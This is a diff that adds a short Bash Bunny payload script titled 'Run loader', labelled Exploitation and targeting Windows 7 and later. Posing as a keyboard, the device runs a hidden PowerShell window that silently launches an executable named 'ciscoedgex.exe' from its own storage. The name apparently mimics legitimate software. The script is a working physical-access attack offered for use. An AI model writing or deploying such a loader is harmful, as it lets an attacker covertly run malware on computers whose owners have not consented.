@@ -1,0 +1,16 @@
+#!/bin/bash
+#
+# Title:         Run loader
+# Author:        S1n1st3r
+# Version:       1.1
+# Target:        Windows 7+
+# Category:      Exploitation
+#
+#
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+RUN WIN powershell Start-Process -WindowStyle hidden -FilePath "((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\ciscoedgex.exe')"
+LED FINISH
+
+
